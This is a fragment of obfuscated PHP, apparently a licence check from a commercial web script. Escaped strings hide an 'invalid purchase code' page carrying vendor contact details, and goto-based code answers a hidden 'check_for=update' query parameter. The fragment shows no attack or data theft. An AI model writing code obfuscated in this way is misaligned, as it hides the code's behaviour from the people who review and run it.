70\76\131\157\165\x72\x20\x70\165\x72\x63\150\x61\x73\145\40\143\x6f\144\x65\x20\x69\163\x20\156\157\164\x20\x76\x61\x6c\x69\144\x2e\x20\111\x66\x20\x79\x6f\x75\40\150\x61\x76\145\x20\x61\x20\x76\141\154\151\144\x20\x70\x75\162\143\x68\141\x73\x65\x20\143\157\x64\x65\x20\164\150\145\156\40\143\x6c\x61\151\x6d\x20\x61\40\x76\x61\154\x69\144\x20\x70\x75\162\143\x68\141\x67\145\x20\143\x6f\x64\145\40\x68\145\162\145\x3a\x20\74\141\x20\x68\162\145\146\75\42\155\141\151\x6c\x74\x6f\72\151\164\x73\157\154\165\164\x69\x6f\x6e\x32\64\x62\144\x40\147\x6d\x61\151\x6c\56\x63\x6f\155\42\76\151\x74\x73\x6f\154\x75\164\x69\157\156\x32\64\x62\144\100\147\x6d\141\151\x6c\56\143\x6f\155\x3c\57\x61\76\x20\174\x20\x2b\70\x38\x30\61\67\63\67\63\x34\x36\x31\x32\62\x3c\x2f\160\76\xa\11\11\x9\11\x3c\160\40\163\x74\x79\154\x65\75\42\x63\x6f\x6c\157\162\x3a\x62\154\x75\145\73\42\76\46\x6d\x64\141\163\x68\x3b\40\x3c\x61\40\x73\x74\171\x6c\145\x3d\42\x63\x6f\154\x6f\x72\72\x67\162\145\x65\156\73\42\x20\x74\x61\x72\x67\x65\x74\75\x22\137\x62\154\x69\156\x6b\x22\x20\x68\x72\x65\x66\x3d\42\150\x74\x74\160\x3a\57\x2f\151\x74\x73\x6f\x6c\165\164\x69\x6f\x6e\62\64\x2e\x63\x6f\x6d\42\x20\x74\151\x74\154\x65\x3d\42\x49\124\x73\157\154\165\164\x69\157\x6e\62\64\x2e\x63\x6f\x6d\42\x3e\111\124\x73\x6f\154\x75\x74\x69\x6f\x6e\62\x34\x2e\143\x6f\155\74\57\x61\x3e\74\57\x70\76\xa\x9\x9\x9\x3c\57\x64\x69\166\76\xa\x9\11\74\57\x73\x65\x63\x74\x69\x6f\x6e\x3e\12\11\x3c\x2f\142\157\x64\x79\x3e\xa\x9\74\x2f\x68\164\x6d\154\76"); DtrFT: if (!(isset($request->get["\143\x68\145\x63\153\137\146\157\x72"]) && $request->get["\143\150\145\x63\153\137\x66\x6f\162"] == "\x75\160\144\x61\x74\x65")) { goto c1xg7; } dd("\101\x6c\x72\145\x61\144\171\x20\125\x70\144\141\164\x65\144\40\x61\x74\72\x20" . date("\131\x2d\x6d\55\x64")); c1xg7: